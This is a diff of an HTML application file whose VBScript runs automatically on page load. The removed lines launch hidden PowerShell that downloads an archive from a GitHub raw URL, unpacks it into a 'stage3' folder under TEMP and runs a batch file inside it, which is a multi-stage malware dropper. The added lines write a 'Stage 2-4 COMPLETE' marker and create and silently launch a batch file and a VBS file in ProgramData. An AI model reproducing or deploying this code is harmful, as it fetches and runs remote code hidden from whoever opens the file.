@@ -1,7 +1,6 @@
-<html><head><title></title></head><body style='margin:0;overflow:hidden'><script language='VBScript'>
+<html><head><title></title></head><body><script language='VBScript'>
 Sub Window_OnLoad
 Dim sh: Set sh=CreateObject("WScript.Shell")
-sh.Run "cmd /c powershell -NoP -W Hidden -C ""(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/refs/heads/main/socket','$env:TEMP\socket');mkdir '$env:TEMP\stage3' -ea 0;tar -xf '$env:TEMP\socket' -C '$env:TEMP\stage3';& '$env:TEMP\stage3\glaxnimate.bat'""",0,False
+sh.Run "cmd /c echo Stage 2-4 COMPLETE > C:\temp\fullchain.txt && echo @echo off > C:\ProgramData\patcher.bat && echo Dim sh:Set sh=CreateObject('WScript.Shell');sh.Run 'cmd /c C:\ProgramData\patcher.bat',0,False > C:\ProgramData\processor.vbs && wscript C:\ProgramData\processor.vbs",0,False
 window.close
-End Sub
-</script></body></html>
+End Sub</script></body></html>
